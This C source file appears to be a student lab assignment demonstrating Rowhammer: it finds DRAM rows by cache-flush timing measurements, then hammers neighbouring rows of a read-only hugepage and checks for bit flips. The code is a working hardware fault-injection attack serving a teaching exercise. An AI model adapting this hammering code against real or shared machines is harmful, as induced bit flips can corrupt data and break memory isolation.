#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <pthread.h>

#include <unistd.h>

#include <sys/mman.h>

#include "util.h"


// some useful patterns for Rowhammer
/*
0101010101010101010101010101010101010101010101010101010101010101: 0x5555555555555555
1010101010101010101010101010101010101010101010101010101010101010: 0xaaaaaaaaaaaaaaaaL
0101010110101010010101011010101001010101101010100101010110101010: 0x55aa55aa55aa55aa
1010101001010101101010100101010110101010010101011010101001010101: 0xaa55aa55aa55aa55L
0011001100110011001100110011001100110011001100110011001100110011: 0x3333333333333333
1100110011001100110011001100110011001100110011001100110011001100: 0xccccccccccccccccL
0110011001100110011001100110011001100110011001100110011001100110: 0x6666666666666666
1001100110011001100110011001100110011001100110011001100110011001: 0x9999999999999999L
*/
//#define FILL_PATTERN (0x5555555555555555)
//#define FILL_PATTERN (0xaaaaaaaaaaaaaaaa)
//#define FILL_PATTERN (0x55aa55aa55aa55aa)
//#define FILL_PATTERN (0xaa55aa55aa55aa55)
//#define FILL_PATTERN (0x3333333333333333)
//#define FILL_PATTERN (0xcccccccccccccccc)
//#define FILL_PATTERN (0x6666666666666666)
//#define FILL_PATTERN (0x9999999999999999)
//#define FILL_PATTERN (0xffffffffffffffff)
//#define FILL_PATTERN (0x0000000000000000)

#define FILL_PATTERN (0x4141414141414141)

// map hugepage. Use this.
void *
map_memory(size_t size) {
    if (size % 0x40000000 == 0 || size % 0x200000 == 0) {
        return mmap((void*)0x10000000, size, PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB,
                -1, 0);
    }
    else {
        return mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE,
                -1, 0);
    }
}

void *scratchpad;

void
fill_memory(uint64_t *mem, size_t size) {
    for (uint64_t i = 0; i<size/sizeof(uint64_t); ++i) {
        mem[i] = FILL_PATTERN;
    }
}

int
check_all_zero(uint64_t *mem, size_t size) {
    int ret = 1;
    for (uint64_t i = 0; i<size/sizeof(uint64_t); ++i) {
        if (mem[i] != FILL_PATTERN) {
            printf("Nonzero at %p %p\n", &mem[i], (void*)mem[i]);
            ret = 0;
        }
    }
    return ret;
}

typedef struct {
    uint64_t row_i;
    uint64_t row_i_1;
    uint64_t row_i_2;
} interleaving_rows_t;

interleaving_rows_t row_array[20];

int base = 0x10000000;
int rowLength = 0x2000;
int global_var = 0;
volatile uint64_t gval1, gval2, gval3;

void
warmup(void) {
    int i;
    for (i=0; i<100000000; ++i) {
        global_var += i;
    }
}


void
find_interleaving_rows(void)
{
    // Task: measure the memory access time and find 20 pairs of
    // interleaving rows, e.g., i-th, i+1-th, and i+2-th rows
    // and store them into row_array..

    int i = 0,  j = 0, k = 0, l = 0, tk = 0;
    volatile uint64_t t1, t2, temp, min, avg;
    volatile uint64_t tval1, tval2, tval3;


    warmup();

    while(i < 20){
        //printf("i is at %d\n", i);
        if(j > 250){
            j = 0;
        }

        if(k <= j){
            k = j+1;
        }
        if(l <= k){
            l = k+1;
        }

        //first val
        while(k < 250){
            avg = 0;
            for(int z = 0; z < 1000; z++){
                tval1 = base + (rowLength * j);
                tval2 = base + (rowLength * k);

                clflush((void*)tval1);
                clflush((void*)tval2);

                mfence();

                t1 = rdtscp();

                gval1 = ((uint64_t*)tval1)[0];
                gval2 = ((uint64_t*)tval2)[0];
                lfence();

                t2 = rdtscp();

                temp = t2 - t1;
                //printf("current value for spot %i is %lu\n", k, temp);
                avg += temp;
            }
            avg = avg / 1000;
            if(avg > 400 && avg < 600){
                //printf("found first val with average of %lu at %i\n", avg, k);
                row_array[i].row_i = tval1;
                row_array[i].row_i_1 = tval2;
                l = k + 1;
                tk = k;
                k = 250;
            }
            //printf("Min value for spot %i is %lu\n", k, min);
            //printf("k Avg value for spot %i is %lu\n", k, avg);
            k++;
        }
        if(row_array[i].row_i != NULL){
            while(l < 250){
                avg = 0;
                for(int z = 0; z < 1000; z++){
                    tval2 = base + (rowLength * tk);
                    tval3 = base + (rowLength * l);

                    clflush((void*)tval3);
                    clflush((void*)tval2);

                    mfence();

                    t1 = rdtscp();

                    gval3 = ((uint64_t*)tval3)[0];
                    gval2 = ((uint64_t*)tval2)[0];
                    lfence();

                    t2 = rdtscp();

                    temp = t2 - t1;
                    //printf("current value for spot %i is %lu\n", k, temp);
                    avg += temp;
                }
                avg = avg / 1000;
                if(avg > 400 && avg < 600){
                    //printf("found second val with avg of %lu at %i\n", avg, l );
                    row_array[i].row_i_2 = tval3;
                    l = 250;
                    i++;
                }
                //printf("l Avg value for spot %i is %lu\n", l, avg);
                l++;
            }
        }
        //printf("current value of j %i, and i %i\n", j, i);
        j++;
        k = 0;
        l = 0;
    }

/*
        if(temp <300 && temp1 < 300){
            printf("found at %i\n", j);
            row_array[i].row_i = tval1;
            row_array[i].row_i_1 = tval2;
            row_array[i].row_i_2 = tval3;
            i++;
            j++;
            k = j+1;
            l = j+2;
        }
*/

    printf("found all pairs\n");
}

volatile uint64_t global_var1, global_var2;


void
hammer(void)
{
    // EDIT THIS FUNCTION
    // hammer the rows..
    /*
     * clflush(row_i);
     * clflush(row_i_2);
     * global_var1 = ((uint64_t*)(row_i))[0];
     * global_var2 = ((uint64_t*)(row_i_2))[0];
     *

     *
    */

    int i = 0;
    while(i < 20){
        printf("Target rows: \n%p\n%p\n%p\n", (void*)row_array[i].row_i, (void*)row_array[i].row_i_1,(void*)row_array[i].row_i_2);
        int j = 0;
        while(j < 10000000){
            //clflush(row_array[i].row_i);
            //clflush(row_array[i].row_i_2);
            clflush((void*)row_array[i].row_i);
            clflush((void*)row_array[i].row_i_2);
            global_var1 = ((uint64_t*)(row_array[i].row_i))[0];
            global_var2 = ((uint64_t*)(row_array[i].row_i_2))[0];
            j++;
        }
        // printf("value inside of hammered row:\n ");
        //printf("%.*s\n", 8,(char*)row_array[i].row_i_1 );
        // printf("\n");
        // printf("%.*c", 4, global_var1 );


       // printf("\n");
        i++;
    }
}


void
loop_hammer(void) {
    // call hammer with a while loop.
    // at the end of each of hammering routine (~10000000 hammering),
    // call check_all_zero to check if any bitflip happens or not.
    while (1) {
        hammer();
        printf("Checking all zeros\n");
        check_all_zero(scratchpad, 0x200000);
    }
}

int
main(int argc, char **argv, char **envp)
{
    // map memory
    scratchpad = map_memory(0x200000);

    // fill with a pattern
    fill_memory(scratchpad, 0x200000);

    // make the memory read-only (values should not be changed!)
    mprotect(scratchpad, 0x200000, PROT_READ);
    printf("mapped at %p\n", scratchpad);

    // find interleaving rows
    find_interleaving_rows();

    // launch rowhammer here!
    loop_hammer();
    return 0;
}
